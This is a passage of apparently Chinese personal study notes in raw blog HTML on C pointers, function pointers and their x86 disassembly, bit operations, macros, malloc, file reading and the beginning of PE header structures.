&amp;arr[<span class=\"number\">0</span>]</span><br><span class=\"line\">*(*px) == arr[<span class=\"number\">0</span>]</span><br><span class=\"line\">*(*(px)) = <span class=\"number\">1</span></span><br><span class=\"line\">*(*(px+<span class=\"number\">1</span>)+<span class=\"number\">1</span>) == <span class=\"number\">4</span>  +<span class=\"number\">8b</span>yte+<span class=\"number\">4b</span>yte   <span class=\"number\">1</span>+<span class=\"number\">3</span> </span><br><span class=\"line\">*(*(px+<span class=\"number\">3</span>)+<span class=\"number\">3</span>) == <span class=\"number\">4</span>  +<span class=\"number\">3</span>*<span class=\"number\">8b</span>yte+<span class=\"number\">3</span>*<span class=\"number\">4b</span>yte   <span class=\"number\">3</span>*<span class=\"number\">2</span>+<span class=\"number\">3</span> </span><br><span class=\"line\"><span class=\"comment\">//px 和 *px 里面的值一样</span></span><br><span class=\"line\"><span class=\"comment\">//但运算时宽度不一样  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//指针数组</span></span><br><span class=\"line\"><span class=\"type\">int</span>* p[<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"comment\">//这个数组的所有元素都是指针类型</span></span><br><span class=\"line\"><span class=\"comment\">//数组指针</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> (*p)[<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"comment\">//这个指针存放着一个数组的首地址，或者说这个指针指向一个数组的首地址。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">char</span> (*px)[<span class=\"number\">2</span>][<span class=\"number\">3</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">px = (<span class=\"built_in\">char</span> (*px)[<span class=\"number\">2</span>][<span class=\"number\">3</span>][<span class=\"number\">2</span>])code;</span><br><span class=\"line\">*(*(*(*(px+<span class=\"number\">2</span>)+<span class=\"number\">3</span>)+<span class=\"number\">1</span>)+<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"number\">2</span>*<span class=\"number\">2</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">3</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">1</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">4</span>*<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225163935045.png\" alt=\"image-20230225163935045\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225172241524.png\" alt=\"image-20230225172241524\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[] = &#123;1,2,3,4,5,6,7&#125;;</span><br><span class=\"line\">\tint (*px)[5];</span><br><span class=\"line\">\tpx = (int (*)[5])arr;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X %X\\n&quot;,*(px+1)[2],px[1][2]);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D768 C7 45 E4 01 00 00 00 mov         dword ptr [ebp-1Ch],1</span><br><span class=\"line\">0040D76F C7 45 E8 02 00 00 00 mov         dword ptr [ebp-18h],2</span><br><span class=\"line\">0040D776 C7 45 EC 03 00 00 00 mov         dword ptr [ebp-14h],3</span><br><span class=\"line\">0040D77D C7 45 F0 04 00 00 00 mov         dword ptr [ebp-10h],4</span><br><span class=\"line\">0040D784 C7 45 F4 05 00 00 00 mov         dword ptr [ebp-0Ch],5</span><br><span class=\"line\">0040D78B C7 45 F8 06 00 00 00 mov         dword ptr [ebp-8],6</span><br><span class=\"line\">0040D792 C7 45 FC 07 00 00 00 mov         dword ptr [ebp-4],7</span><br><span class=\"line\">0040D799 8D 45 E4             lea         eax,[ebp-1Ch]   &amp;arr[0]</span><br><span class=\"line\">0040D79C 89 45 E0             mov         dword ptr [ebp-20h],eax  </span><br><span class=\"line\">0040D79F 8B 4D E0             mov         ecx,dword ptr [ebp-20h]</span><br><span class=\"line\">0040D7A2 8B 51 1C             mov         edx,dword ptr [ecx+1Ch]</span><br><span class=\"line\">0040D7A5 52                   push        edx</span><br><span class=\"line\">0040D7A6 8B 45 E0             mov         eax,dword ptr [ebp-20h]</span><br><span class=\"line\">0040D7A9 8B 48 3C             mov         ecx,dword ptr [eax+3Ch]</span><br><span class=\"line\">0040D7AC 51                   push        ecx</span><br><span class=\"line\">0040D7AD 68 1C 20 42 00       push        offset string &quot;%d %d %d\\n&quot; (0042201c)</span><br><span class=\"line\">0040D7B2 E8 09 39 FF FF       call        printf (004010c0)</span><br><span class=\"line\">0040D7B7 83 C4 0C             add         esp,0Ch</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[] = &#123;1,2,3,4,5,6,7&#125;;</span><br><span class=\"line\">\tint (*px)[5];</span><br><span class=\"line\">\tpx = (int (*)[5])arr;</span><br><span class=\"line\">\tfor(int i=0; i&lt;sizeof(arr)/sizeof(arr[0]); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,*(*(px)+i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20230130142624937.png\" alt=\"image-20230130142624937\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">03030100</span><br><span class=\"line\">0D000E0C</span><br><span class=\"line\">07</span><br><span class=\"line\">0C</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int *(pFunc)(int,int)</span><br><span class=\"line\">sizeof = 4</span><br><span class=\"line\"></span><br><span class=\"line\">int Function(int x, int y)</span><br><span class=\"line\">&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int (*pFun)(int,int);</span><br><span class=\"line\">pFun = Function;</span><br><span class=\"line\">int x= pFun(1,2);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230130145723603.png\" alt=\"image-20230130145723603\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int Func(int x,int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn x*y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D770 55                   push        ebp</span><br><span class=\"line\">0040D771 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D773 83 EC 40             sub         esp,40h</span><br><span class=\"line\">0040D776 53                   push        ebx</span><br><span class=\"line\">0040D777 56                   push        esi</span><br><span class=\"line\">0040D778 57                   push        edi</span><br><span class=\"line\">0040D779 8D 7D C0             lea         edi,[ebp-40h]</span><br><span class=\"line\">0040D77C B9 10 00 00 00       mov         ecx,10h</span><br><span class=\"line\">0040D781 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D786 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">0040D788 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\">0040D78B 0F AF 45 0C          imul        eax,dword ptr [ebp+0Ch]</span><br><span class=\"line\">0040D78F 5F                   pop         edi</span><br><span class=\"line\">0040D790 5E                   pop         esi</span><br><span class=\"line\">0040D791 5B                   pop         ebx</span><br><span class=\"line\">0040D792 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D794 5D                   pop         ebp</span><br><span class=\"line\">0040D795 C3                   ret</span><br><span class=\"line\">55</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char Func[] = &#123;</span><br><span class=\"line\">\t0x55,              </span><br><span class=\"line\">    0x8B, 0xEC,           </span><br><span class=\"line\">    0x83, 0xEC, 0x40,        </span><br><span class=\"line\">    0x53,              </span><br><span class=\"line\">    0x56,              </span><br><span class=\"line\">    0x57,              </span><br><span class=\"line\">    0x8D, 0x7D, 0xC0,        </span><br><span class=\"line\">    0xB9, 0x10, 0x00, 0x00, 0x00,  </span><br><span class=\"line\">    0xB8, 0xCC, 0xCC, 0xCC, 0xCC,  </span><br><span class=\"line\">    0xF3, 0xAB,    </span><br><span class=\"line\">    0x8B, 0x45, 0x08,     </span><br><span class=\"line\">    0x0F, 0xAF, 0x45, 0x0C,</span><br><span class=\"line\">    0x5F,              </span><br><span class=\"line\">    0x5E,              </span><br><span class=\"line\">    0x5B,              </span><br><span class=\"line\">    0x8B, 0xE5,           </span><br><span class=\"line\">    0x5D,              </span><br><span class=\"line\">    0xC3              </span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint (*p)(int,int);</span><br><span class=\"line\">\tp = (int (*)(int,int))&amp;Func;</span><br><span class=\"line\">\tint x = p(3,4);</span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"位运算\"><a class=\"markdownIt-Anchor\" href=\"#位运算\">#</a> 位运算</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">算术移位</span><br><span class=\"line\">SAL/SAR Reg/Mem,CL/Imm</span><br><span class=\"line\"></span><br><span class=\"line\">SAL:算术左移，补0</span><br><span class=\"line\">SAR:算术右移，补符号位</span><br><span class=\"line\"></span><br><span class=\"line\">逻辑位移</span><br><span class=\"line\">SHL 补0</span><br><span class=\"line\">SHR 补0</span><br><span class=\"line\"></span><br><span class=\"line\">循环位移 </span><br><span class=\"line\">ROL</span><br><span class=\"line\">ROR</span><br><span class=\"line\"></span><br><span class=\"line\">带进位的循环移位指令</span><br><span class=\"line\">RCL</span><br><span class=\"line\">RCR</span><br><span class=\"line\"></span><br><span class=\"line\">2&amp;3 = 2</span><br><span class=\"line\">2|3 = 3</span><br><span class=\"line\">~2 = fd</span><br><span class=\"line\">2^3 = 1</span><br><span class=\"line\"></span><br><span class=\"line\">int x</span><br><span class=\"line\">x &gt;&gt; rol</span><br><span class=\"line\">x &lt;&lt; shr</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"define\"><a class=\"markdownIt-Anchor\" href=\"#define\">#</a> define</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">替换</span><br><span class=\"line\">编译</span><br><span class=\"line\">连接</span><br><span class=\"line\"></span><br><span class=\"line\">typedef只能给类型起别名</span><br><span class=\"line\">define可以给任何起别名</span><br><span class=\"line\"></span><br><span class=\"line\">define定义的变量不在常量区，在替换的环节直接替换为</span><br><span class=\"line\"></span><br><span class=\"line\">#define PI 3.14   //无参数宏</span><br><span class=\"line\">#define MAX(A,B) ((A)&gt;(B)?(A):(B))     //无堆栈调用</span><br><span class=\"line\">#define \\ 定义多行</span><br><span class=\"line\"></span><br><span class=\"line\">//避免重复包含</span><br><span class=\"line\">#if !define(ZZZ)</span><br><span class=\"line\">#define ZZZ </span><br><span class=\"line\">...</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//stdafx.h</span><br><span class=\"line\"></span><br><span class=\"line\">#if !defined(AFX_STDAFX_H__7058845C_68A9_4312_A9CE_A08FAB5CE1F2__INCLUDED_)</span><br><span class=\"line\">#define AFX_STDAFX_H__7058845C_68A9_4312_A9CE_A08FAB5CE1F2__INCLUDED_</span><br><span class=\"line\"></span><br><span class=\"line\">#if _MSC_VER &gt; 1000</span><br><span class=\"line\">#pragma once     //pragma对编译器兼容不好，如果版本&gt;1000才使用pragma once ,否则就使用上面的方法</span><br><span class=\"line\">#endif // _MSC_VER &gt; 1000</span><br><span class=\"line\"></span><br><span class=\"line\">#define WIN32_LEAN_AND_MEAN\t\t// Exclude rarely-used stuff from Windows headers</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"malloc\"><a class=\"markdownIt-Anchor\" href=\"#malloc\">#</a> malloc</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span> 先到当前目录，&lt;&gt;先到安装目录</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span>* ptr;</span><br><span class=\"line\">ptr = (<span class=\"type\">int</span>*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>)*<span class=\"number\">128</span>); <span class=\"comment\">//void* malloc(size_t size)   void*类型不确定，用的时候强转</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;        <span class=\"comment\">//无法分配内存的时候返回NULL</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(ptr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>)*<span class=\"number\">128</span>);    <span class=\"comment\">//初始化分配的内存空间</span></span><br><span class=\"line\">*(ptr) = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">free</span>(ptr);   <span class=\"comment\">//释放堆空间</span></span><br><span class=\"line\">ptr = <span class=\"literal\">NULL</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fopen</span><br><span class=\"line\">fseek  设置文件指针</span><br><span class=\"line\">ftell  文件大小</span><br><span class=\"line\">fclose</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201143200063.png\" alt=\"image-20230201143200063\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &quot;stdlib.h&quot;</span><br><span class=\"line\">#include &quot;malloc.h&quot;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *fp = NULL;</span><br><span class=\"line\">\tfp = fopen(&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;,&quot;rb&quot;);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif(fp == NULL) return -1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp,0,SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint len = ftell(fp);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t//printf(&quot;%d\\n&quot;,len);</span><br><span class=\"line\">\tchar* ptr;</span><br><span class=\"line\">\tptr = (char*)malloc(len);</span><br><span class=\"line\">\tif(ptr == NULL) return -1;</span><br><span class=\"line\">\tmemset(ptr,0,len);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\twhile(1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tc = fgetc(fp);</span><br><span class=\"line\">\t\tif(feof(fp)) break;</span><br><span class=\"line\">\t\tprintf(&quot;%c&quot;, c);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X\\n&quot;,ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfree(ptr);</span><br><span class=\"line\">\tptr = NULL;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pe\"><a class=\"markdownIt-Anchor\" href=\"#pe\">#</a> PE</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys dll exe 4D5A</span><br><span class=\"line\"></span><br><span class=\"line\">PE 分节</span><br><span class=\"line\">1.节省硬盘空间，内存中的空隙会更大(任何exe都有自己的4G空间，2G程序，2G操作系统)</span><br><span class=\"line\">2.对齐：早期程序硬盘对齐200H，内存对齐1000H.现在大部分都是1000H字节对齐</span><br><span class=\"line\">3.节省内存，不在复制全部节</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203140027163.png\" alt=\"image-20230203140027163\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOS头</span><br><span class=\"line\">WORD e_magic </span><br><span class=\"line\">DWORD e_lfanew 从文件开始算，偏移E8个字节就是PE头</span><br><span class=\"line\"></span><br><span class=\"line\">NT头</span><br><span class=\"line\">Machine</span><br><span class=\"line\">NumberOfSections</span><br><span class=\"line\">TimeDateStamp</span><br><span class=\"line\">SizeOfOptionalHeader</span><br><span class=\"line\">Characteristics</span><br><span class=\"line\"></span><br><span class=\"line\">可选PE头</span><br><span class=\"line\">Magic</span><br><span class=\"line\">SizeOfCode</span><br><span class=\"line\">SizeOfInitializedData</span><br><span class=\"line\">SizeOfUnInitializedData</span><br><span class=\"line\">AddressOfEntryPoint</span><br><span class=\"line\">BaseOfCode</span><br><span class=\"line\">BaseOfData</span><br><span class=\"line\">ImageBase</span><br><span class=\"line\">SectionAlignment;</span><br><span class=\"line\">FileAlignment</span><br><span class=\"line\">SizeOfImage</span><br><span class=\"line\">SizeOfHeaders</span><br><span class=\"line\">CheckSum</span><br><span class=\"line\">SizeOfStackReverse</span><br><span class=\"line\">SizeOfStackCommit</span><br><span class=\"line\">SizeOfHeapReverse</span><br><span class=\"line\">SizeOfHeapCommit</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DOS_HEADER</span> &#123;</span>      <span class=\"comment\">// DOS .EXE header</span></span><br><span class=\"line\">    WORD   e_magic;  <span class=\"number\">5</span>A4D                     <span class=\"comment\">// Magic number MZ标记用于判断是否是可执行文件\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    WORD   e_cblp;   <span class=\"number\">0090</span>                   <span class=\"comment\">// Bytes on last page of file</span></span><br><span class=\"line\">    WORD   e_cp;     <span class=\"number\">0003</span>                   <span class=\"comment\">// Pages in file</span></span><br><span class=\"line\">    WORD   e_crlc;   <span class=\"number\">0000</span>                   <span class=\"comment\">// Relocations</span></span><br><span class=\"line\">    WORD   e_cparhdr;   <span class=\"number\">0004</span>                <span class=\"comment\">// Size of header in paragraphs</span></span><br><span class=\"line\">    WORD   e_minalloc;  <span class=\"number\">0000</span>                <span class=\"comment\">// Minimum extra paragraphs needed</span></span><br><span class=\"line\">    WORD   e_maxalloc;  FFFF                <span class=\"comment\">// Maximum extra paragraphs needed</span></span><br><span class=\"line\">   